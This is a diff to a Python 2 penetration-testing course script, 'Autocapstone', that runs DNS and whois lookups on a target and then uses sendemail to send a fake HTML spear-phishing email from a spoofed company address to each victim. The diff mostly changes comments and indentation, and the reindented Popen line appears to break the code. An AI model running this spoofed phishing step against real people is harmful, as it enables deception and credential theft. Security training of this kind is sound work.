@@ -1,11 +1,11 @@
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
 
-##################################################################
+#
 # Autocapstone v0.4
 # Created for the OMA course from Parrot Labs at KEYW Corporation.
 # https://github.com/vesche
-##################################################################
+#
 
 import json
 import os
@@ -49,7 +49,7 @@ def main():
     write_cmd("nslookup {}".format(url), "nslookup")
     print "Performing whois..."
     write_cmd("whois {}".format(url), "whois")
-    print "Finding nameservers...'
+    print "Finding nameservers..."
     write_cmd("dig {} NS".format(url), "nameservers")
 
     # get web server ip
@@ -155,10 +155,10 @@ def main():
                     f.write(email_text.format(fname))
 
                 email_cmd = list("sendemail -f mrobinson@{0} -t {1} \
-                -u \"Hello!\" -s {2}:25 -o message-content-type=html \
-                -o message-file=/root/scripts/fake_email.html".format(\
-                url, victim, mail_ip).split())
-                subprocess.Popen(email_cmd)
+                    -u \"Hello!\" -s {2}:25 -o message-content-type=html \
+                    -o message-file=/root/scripts/fake_email.html".format(
+                        url, victim, mail_ip).split())
+                        subprocess.Popen(email_cmd)
 
                 print "Spear phishing email sent to {}!".format(victim)
 
